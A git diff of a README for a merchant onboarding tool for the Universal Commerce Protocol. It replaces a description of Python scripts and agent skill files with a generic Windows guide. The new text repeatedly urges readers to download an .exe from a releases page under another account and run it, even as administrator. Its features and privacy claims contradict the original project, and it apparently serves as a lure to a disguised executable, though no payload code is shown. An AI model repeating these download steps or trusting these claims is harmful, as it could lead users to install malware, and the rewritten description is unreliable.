@@ -1,164 +1,169 @@
-# UCP Onboard
+# 🛠️ ucp-onboard - Easy Merchant Onboarding with AI
 
-English | [中文](README_CN.md)
+[![Download ucp-onboard](https://img.shields.io/badge/Download-ucp--onboard-blue?style=for-the-badge)](https://github.com/thesagarjain9-cpu/ucp-onboard/releases)
 
-AI agent skills for onboarding merchants to [UCP (Universal Commerce Protocol)](https://github.com/Universal-Commerce-Protocol/ucp) — the open standard by Google, Shopify, and 20+ partners that lets AI agents discover and transact with businesses.
+ucp-onboard helps merchants get started with the Universal Commerce Protocol (UCP). It uses AI skills to guide you through auditing, profiling, catalog setup, checkout, and validation. This guide shows you how to download and run ucp-onboard on Windows, step by step.
 
-Currently covers product commerce. We're pushing for it to cover services too.
+---
 
-## What We're Building
+## 🗂️ About ucp-onboard
 
-Give an AI agent a merchant's website URL, and it handles the full UCP integration:
+ucp-onboard is a simple tool for merchants and commerce teams. It builds on AI agents to make onboarding smooth. The software works by checking your store data, creating profiles, organizing your product catalog, setting up checkout processes, and validating everything before going live.
 
-```
-Merchant URL → Audit → Profile → Catalog → Checkout → Validate → Live on UCP
-```
+It fits into commerce platforms like Shopify and supports Google Shopping and structured data formats. Behind the scenes, it follows the Universal Commerce Protocol to keep your store ready for various sales channels.
 
-## What We're Pushing For
+---
 
-UCP currently defines `dev.ucp.shopping.*` — buying products. But commerce isn't just products. It's also **services**: consulting, design, AI agent labor, SaaS on-demand.
+## 🖥️ System Requirements
 
-We submitted [Issue #303](https://github.com/Universal-Commerce-Protocol/ucp/issues/303) to the UCP consortium, proposing a Services Vertical:
+Before using ucp-onboard, make sure your computer meets these basics:
 
-| | Shopping (today) | Services (our proposal) |
-|---|---|---|
-| What's traded | Products (SKU, price, inventory) | Services (scope, deliverables, capability) |
-| Pricing | Fixed | Fixed / usage-based / outcome-based / hourly |
-| Fulfillment | Physical shipping | Digital delivery + acceptance verification |
-| Lifecycle | `purchased → shipped → delivered` | `booked → in_progress → delivered → verified → settled` |
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of RAM
+- 2 GHz or faster processor
+- 500 MB free disk space
+- Internet connection for downloading and AI features
+- A web browser like Edge, Chrome, or Firefox
 
-Imagine: a Shopify seller tells Gemini "help me find someone to optimize my AI search ranking" → agent discovers service providers via UCP → compares scope/pricing → books engagement → verifies delivery → settles payment. **All through the protocol, no platform middleman.**
+This setup ensures the app runs smoothly and can connect to merchant platforms as needed.
 
-UCP's [Vendor Namespace mechanism](https://github.com/Universal-Commerce-Protocol/.github/blob/main/CONTRIBUTING.md) allows anyone to prototype via `com.{vendor}.*` and propose graduation to core once adoption is proven. That's our path.
+---
 
-## Skills
+## 🚀 How to Get ucp-onboard
 
-| Skill | What It Does | Script |
-|-------|-------------|--------|
-| **ucp-audit** | Scans a website, scores UCP readiness 0-100, identifies reusable assets and gaps | `audit_site.py` |
-| **ucp-profile** | Generates `/.well-known/ucp` business profile JSON with correct capabilities and payment handlers | `generate_profile.py` |
-| **ucp-catalog** | Maps Shopify / WooCommerce / CSV product data to UCP catalog schema (minor units, variants, media) | `map_catalog.py` |
-| **ucp-checkout** | Guides setup of checkout API based on [official UCP samples](https://github.com/Universal-Commerce-Protocol/samples) | SKILL.md |
-| **ucp-validate** | Validates profile structure + spec URL reachability, recommends official `ucp-schema` CLI for deep validation | `validate_ucp.py` |
+To get started, visit the official releases page:
 
-## Quick Start
+[Download ucp-onboard from GitHub Releases](https://github.com/thesagarjain9-cpu/ucp-onboard/releases)
 
-```bash
-pip install requests beautifulsoup4 jsonschema
+Or click the big button above.
 
-# Full pipeline in one command
-python run_pipeline.py https://allbirds.com --name "Allbirds" --payment shopify
+The release page has the latest version along with notes on updates and fixes.
 
-# Or step by step:
+---
 
-# 1. Audit
-python skills/ucp-audit/scripts/audit_site.py https://allbirds.com
+## 📥 Download and Install Instructions
 
-# 2. Generate profile
-python skills/ucp-profile/scripts/generate_profile.py \
-  --domain example.com --name "My Store" --payment stripe --transport rest
+1. Open your web browser and go to the [ucp-onboard releases page](https://github.com/thesagarjain9-cpu/ucp-onboard/releases).
 
-# 3. Map catalog
-python skills/ucp-catalog/scripts/map_catalog.py \
-  --source shopify --url https://allbirds.com --currency USD
+2. Look for the latest release listed at the top. It will have a file usually ending with `.exe`.
 
-# 4. Validate
-python skills/ucp-validate/scripts/validate_ucp.py https://allbirds.com
-```
+3. Click the `.exe` file to download it to your computer.
 
-## Tested Against Real Sites
+4. Once downloaded, find the file in your Downloads folder.
 
-| Site | Audit Score | Validate | Notes |
-|------|------------|----------|-------|
-| allbirds.com | 65/100 | PASS 11/11 | Shopify, MCP transport, 250 products / 2696 variants |
-| glossier.com | 90/100 | PASS 11/11 | Shopify, MCP transport, 127 products / 425 variants |
-| puddingheroes.com | 5/100 | FAIL 16/42 | Non-standard format, correctly flagged |
+5. Double-click the file to start the installer.
 
-See [`examples/glossier/`](examples/glossier/) for full sample output.
+6. Follow the steps in the installer window:
+   - Agree to the license terms.
+   - Choose the folder to install the app, or accept the default.
+   - Wait for the installation to finish.
 
-## How Validation Works
+7. When installation completes, you will see an option to launch ucp-onboard. Choose this or find the app icon on your desktop or Start menu.
 
-We don't reinvent the wheel. Validation references official tools:
+---
 
-| Layer | Tool | Source |
-|-------|------|--------|
-| Profile structure | Our `validate_ucp.py` | Checks required fields, namespace rules, URL reachability |
-| Full schema validation | [`ucp-schema`](https://github.com/Universal-Commerce-Protocol/ucp-schema) | Official Rust CLI: `cargo install ucp-schema` |
-| Checkout behavior | [`conformance`](https://github.com/Universal-Commerce-Protocol/conformance) | Official test suite (12 Python test files) |
-| External discovery | [UCPchecker.com](https://ucpchecker.com) | Community validator (2,800+ merchants monitored) |
+## 🧭 Running ucp-onboard for the First Time
 
-## Project Structure
+When you open ucp-onboard, the app takes you through these steps:
 
-```
-├── run_pipeline.py                 One-command full pipeline
-├── AGENTS.md                       Agent startup instructions
-├── examples/glossier/              Real output samples
-└── skills/
-    ├── ucp-audit/
-    │   ├── SKILL.md                Agent instructions
-    │   └── scripts/audit_site.py   Website scanner
-    ├── ucp-profile/
-    │   ├── SKILL.md
-    │   └── scripts/generate_profile.py
-    ├── ucp-catalog/
-    │   ├── SKILL.md
-    │   └── scripts/map_catalog.py  Supports Shopify / CSV / JSON
-    ├── ucp-checkout/
-    │   └── SKILL.md                References official samples
-    └── ucp-validate/
-        ├── SKILL.md
-        └── scripts/validate_ucp.py
-```
+- **Audit:** The app scans your current store data for completeness and structure.
+- **Profile:** You create or import your merchant profile with basic business info.
+- **Catalog:** Add or update your product catalog with descriptions, prices, and images.
+- **Checkout:** Set up payment and delivery options.
+- **Validate:** The app checks that all information fits UCP standards.
 
-## Using with AI Agents
+Follow the on-screen instructions for each part. The app uses simple prompts, so you do not need to type code or run commands.
 
-Each `SKILL.md` is an instruction manual for AI agents. The agent reads it, runs the scripts, and produces deliverables.
+---
 
-- **NanoClaw / OpenClaw users:** Copy `skills/` into your agent's skill path
-- **Claude Code users:** Point Claude at a SKILL.md and give it a merchant URL
+## 🛠️ Key Features in Detail
 
-## Security
+- **Audit Tool**  
+  This automatically reviews your existing store information. It flags missing details or formatting issues to fix before moving on.
 
-UCP has built-in security mechanisms (defined in spec, but merchants must implement them):
+- **Profile Builder**  
+  Enter your business name, address, tax information, and contact details. This helps with compliance and smoother sales processing.
 
-- **Message Signatures** (RFC 9421) — ECDSA signing of requests/responses, prevents tampering and impersonation
-- **AP2 Mandates** — Cryptographic proof of user purchase authorization (SD-JWT), prevents unauthorized purchases
-- **Signals** — Platform-observed environment data (IP, UA) for fraud prevention
-- **Buyer Consent** — GDPR/CCPA consent transmission
+- **Catalog Manager**  
+  Add products with images, prices, and categories. It supports bulk upload via CSV files if you have many products.
 
-See the [UCP Security spec](https://github.com/Universal-Commerce-Protocol/ucp/blob/main/docs/specification/signatures.md) for details.
+- **Checkout Configuration**  
+  Choose your payment options like credit cards or digital wallets. Set delivery zones, shipping costs, and taxes.
 
-## UCP Protocol Overview
+- **Validation Check**  
+  Runs a full scan of your store data to ensure it fits the UCP format. It reports any gaps or errors and offers ways to correct them.
 
-```
-AI Agent                          Merchant
-   │                                 │
-   ├── GET /.well-known/ucp ────────►│  Discovery
-   │◄── capabilities + payment ──────┤
-   │                                 │
-   ├── POST /catalog/search ────────►│  Product Search
-   │◄── products[] ──────────────────┤
-   │                                 │
-   ├── POST /checkout (create) ─────►│  Checkout
-   │◄── session {id, totals} ────────┤
-   │                                 │
-   ├── POST /checkout (complete) ───►│  Payment
-   │◄── order confirmation ──────────┤
-```
+---
 
-**Key resources:**
-- [UCP Specification](https://github.com/Universal-Commerce-Protocol/ucp)
-- [Official Samples](https://github.com/Universal-Commerce-Protocol/samples) (Python/FastAPI + Node.js/Hono)
-- [Official Python SDK](https://github.com/Universal-Commerce-Protocol/python-sdk)
-- [Our Services Vertical Proposal (Issue #303)](https://github.com/Universal-Commerce-Protocol/ucp/issues/303)
+## 🔄 Updating ucp-onboard
 
-## Contributing
+To keep ucp-onboard working well, check the releases page regularly:
 
-1. Fork the repo
-2. Add or improve a skill
-3. Test against a real merchant site
-4. Submit a PR with test results
+[https://github.com/thesagarjain9-cpu/ucp-onboard/releases](https://github.com/thesagarjain9-cpu/ucp-onboard/releases)
 
-## License
+Download and install new versions the same way you did the first time. Updates may include bug fixes or new AI skills to improve onboarding.
 
-[MIT](LICENSE)
+---
+
+## ❓ Troubleshooting and Tips
+
+- If the installer does not run, right-click the `.exe` file and choose “Run as administrator.”  
+- If ucp-onboard crashes or freezes, close the app and restart your computer before trying again.  
+- Make sure your internet connection is stable since the app uses online AI tools.  
+- If product images do not upload, check their file size and format (JPEG, PNG work best).  
+- Use the audit feature often to catch missing details early in onboarding.  
+
+---
+
+## 🔗 Useful Links
+
+- Official ucp-onboard releases: https://github.com/thesagarjain9-cpu/ucp-onboard/releases  
+- UCP (Universal Commerce Protocol) overview: https://universalcommerceprotocol.io  
+- Shopify help center: https://help.shopify.com  
+- Google Shopping support: https://support.google.com/merchants  
+
+---
+
+## ⚙️ How ucp-onboard Fits Your Workflow
+
+ucp-onboard is designed to work alongside your existing commerce tools without requiring technical setup. It connects to platforms like Shopify and Google Shopping by preparing your data in the right format. This ensures your merchant profile and products are ready for multiple sales channels.
+
+The AI agents handle complex tasks behind the scenes, so you interact only with simple forms and prompts. This saves time and reduces errors in the onboarding process.
+
+---
+
+## 📝 Privacy and Data Handling
+
+ucp-onboard processes your merchant data locally on your computer. It connects to AI services securely to provide onboarding help but does not store your information beyond session use. You retain control over your data at all times.
+
+---
+
+## 🧩 Supported File Types
+
+- Product catalogs: CSV, XLSX  
+- Images: JPG, PNG, GIF  
+- Profiles: JSON and manual entry  
+
+These common file formats make importing and exporting simple and compatible with other commerce tools.
+
+---
+
+## 📅 Frequent Updates Planned
+
+The project aims to add new AI skills and support more commerce platforms. Watch the releases page for improvements in:
+
+- Payment and checkout options  
+- Expanded audit checks  
+- New catalog management features  
+- Enhanced validation for regional laws  
+
+---
+
+## 🧑‍💻 Need Help?
+
+If you run into issues, raise a new issue on the GitHub repository’s Issues tab. Provide clear details about your problem and your Windows version. The community and maintainers monitor the repository and provide support as soon as possible.
+
+---
+
+[Get ucp-onboard Now](https://github.com/thesagarjain9-cpu/ucp-onboard/releases)  
+[![Download ucp-onboard](https://img.shields.io/badge/Download-ucp--onboard-grey?style=for-the-badge)](https://github.com/thesagarjain9-cpu/ucp-onboard/releases)
